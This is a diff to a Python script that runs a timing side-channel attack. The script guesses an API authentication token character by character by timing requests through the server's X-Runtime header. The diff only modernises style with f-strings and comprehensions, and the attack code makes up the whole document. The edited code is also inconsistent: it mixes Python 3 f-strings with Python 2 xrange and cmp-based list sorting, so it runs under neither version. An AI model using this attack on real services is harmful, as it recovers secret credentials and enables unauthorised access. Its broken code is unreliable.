@@ -36,7 +36,7 @@ def get_next_char_with_timing(current_token_chars):
         for current_char in shuffled_charset:
             test_token = current_token_chars + current_char + CHARSET[0] * (VALID_TOKEN_LEN - 1)
 
-            response = session.get(URL, headers={'Authorization': 'Token %s' % test_token})
+            response = session.get(URL, headers={'Authorization': f'Token {test_token}'})
             current_charset_timing[current_char] = float(response.headers['X-Runtime'])
 
         progress(i, NUM_SAMPLES)
@@ -49,10 +49,11 @@ def get_next_char_with_timing(current_token_chars):
             else:
                 historic_charset_timing[ichar] = [ranked_charset_timing[ichar]]
 
-    average_char_ranking = {}
+    average_char_ranking = {
+        ichar: numpy.mean(historic_charset_timing[ichar])
+        for ichar in historic_charset_timing
+    }
 
-    for ichar in historic_charset_timing:
-        average_char_ranking[ichar] = numpy.mean(historic_charset_timing[ichar])
 
     avg_items = average_char_ranking.items()
     avg_items.sort(value_sort)
@@ -66,16 +67,11 @@ def get_next_char_with_timing(current_token_chars):
 
 
 def rank_charset_timing(charset_timing):
-    ranked = {}
-
     charset_items = charset_timing.items()
     charset_items.sort(value_sort)
     charset_items.reverse()
 
-    for i, item in enumerate(charset_items):
-        ranked[item[0]] = i
-
-    return ranked
+    return {item[0]: i for i, item in enumerate(charset_items)}
 
 
 def value_sort(x, y):
@@ -86,8 +82,8 @@ def warm_up(warm_up_token):
     """
     Use different TCP/IP connections to warm up all the threads
     """
-    for i in xrange(20):
-        requests.get(URL, headers={'Authorization': 'Token %s' % warm_up_token})
+    for _ in xrange(20):
+        requests.get(URL, headers={'Authorization': f'Token {warm_up_token}'})
 
 
 if __name__ == '__main__':
